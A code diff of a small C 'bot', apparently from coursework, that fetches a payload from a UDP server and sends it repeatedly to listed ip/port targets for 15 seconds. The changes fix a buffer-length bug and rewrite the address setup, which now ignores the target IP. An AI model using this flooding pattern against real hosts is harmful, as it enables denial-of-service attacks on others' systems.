@@ -9,6 +9,7 @@
 #include <netinet/in.h>
 #include <sys/time.h>
 #include <err.h>
+#include <arpa/inet.h>
 
 #define MESSAGE_MAXLEN 512
 #define PORTLEN 22
@@ -49,7 +50,7 @@ void parse_packet(struct msg *message, char *packet, int bytes_recv){
 	message->number_of_pairs = counter;
 }
 
-/*
+	/*
 	program the bot 
 	sends a "HELLO\n" packet to the UDP_server and then receives the payload from UDP_server
 */
@@ -89,7 +90,7 @@ void prog(struct msg *message, char *payload){
 	printf("sent package to the udp_serv\n");
 
 	//waits for the UDP_server to send the payload
-	int bytes_recv = recvfrom(sock, payload, strlen(payload), 0, NULL, NULL);
+	int bytes_recv = recvfrom(sock, payload, MESSAGE_MAXLEN, 0, NULL, NULL);
 
 	printf("%s\n", payload);
 }
@@ -101,6 +102,7 @@ void prog(struct msg *message, char *payload){
 */ 
 void run(struct msg *message, char *payload){
 
+
 	struct timeval tstart;
 	struct timeval tend;
 
@@ -109,11 +111,11 @@ void run(struct msg *message, char *payload){
 	char *target_ip;
 	char *target_port;
 
-	struct addrinfo *target;
-	struct addrinfo hints;
+	struct sockaddr_in target;
+	//struct addrinfo hints;
 
-	memset(&hints, 0, sizeof(hints));
-	hints.ai_socktype = SOCK_DGRAM;
+	//memset(&hints, 0, sizeof(hints));
+	//hints.ai_socktype = SOCK_DGRAM;
 
 	int sock;
 	sock = socket(PF_INET, SOCK_DGRAM, 0);
@@ -122,7 +124,6 @@ void run(struct msg *message, char *payload){
 		err(2, "socket error\n");
 	}
 
-	int gai_error;
 
 	// send payload for 15 seconds
 	gettimeofday(&tstart, NULL);
@@ -130,14 +131,18 @@ void run(struct msg *message, char *payload){
 
 	while(tend.tv_sec - tstart.tv_sec < 15){
 		for(i = 0; i < message->number_of_pairs; ++i){
-			target_ip = message->entries[i].ip;
-			target_port = message->entries[i].port;
+			memset(&target, 0, sizeof(target));
+			target.sin_family = AF_INET;
+			target.sin_addr.s_addr = INADDR_ANY; 
+			target.sin_port = htons(atoi(message->entries[i].port));
 
-			if((gai_error = getaddrinfo(target_ip, target_port, &hints, &target)) != 0){
-				err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
-			}
+			//if((gai_error = getaddrinfo(target_ip, target_port, &hints, &target)) != 0){
+			//	err(3, "getaddrinfo() failed. %s\n", gai_strerror(gai_error));
+			//}
 
-			int bytes_sent = sendto(sock, payload, strlen(payload), 0, target->ai_addr, target->ai_addrlen);
+			int bytes_sent = sendto(sock, payload, strlen(payload), 0, 
+						(const struct sockaddr *) &target,
+						sizeof(target));
 		}
 
 		gettimeofday(&tend, NULL);
